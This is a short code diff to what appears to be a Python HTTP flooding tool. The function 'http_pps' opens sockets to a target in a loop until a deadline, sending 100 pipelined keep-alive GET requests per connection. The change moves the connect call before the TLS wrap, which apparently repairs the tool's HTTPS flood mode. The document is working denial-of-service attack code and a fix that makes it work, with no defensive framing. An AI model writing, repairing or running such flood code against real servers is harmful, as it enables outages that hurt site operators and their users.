@@ -111,9 +111,9 @@ def http_pps(url, until):
     packet = f"GET {'/' if url.path is None else url.path} HTTP/1.1\r\nConnection: keep-alive\r\nHost:{url.netloc}\r\n\r\n" * 100
     while until > time.time():
         sock = socket.socket()
+        sock.connect((url.hostname, int(url.port)))
         if url.scheme == "https":
             sock = ssl.wrap_socket(sock)
-        sock.connect((url.hostname, int(url.port)))
         sock.send(packet.encode())
         sock.close()
 
